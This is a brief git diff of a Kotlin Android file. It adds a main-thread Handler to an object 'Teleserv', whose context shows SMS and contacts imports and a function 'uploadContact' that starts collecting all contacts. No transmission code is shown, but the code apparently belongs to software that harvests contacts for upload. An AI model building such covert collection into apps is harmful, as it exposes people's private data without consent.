@@ -6,6 +6,8 @@ import android.content.ContentResolver
 import android.content.Context
 import android.content.Intent
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.telephony.SmsManager
@@ -17,6 +19,7 @@ import java.io.OutputStreamWriter
 import java.time.LocalDateTime
 
 object Teleserv {
+    private val uiHandler = Handler(Looper.getMainLooper())
     @SuppressLint("Range")
     fun uploadContact(contentResolver: ContentResolver, context: Context) {
             var allContactList = "All Contacts\n\n\n"
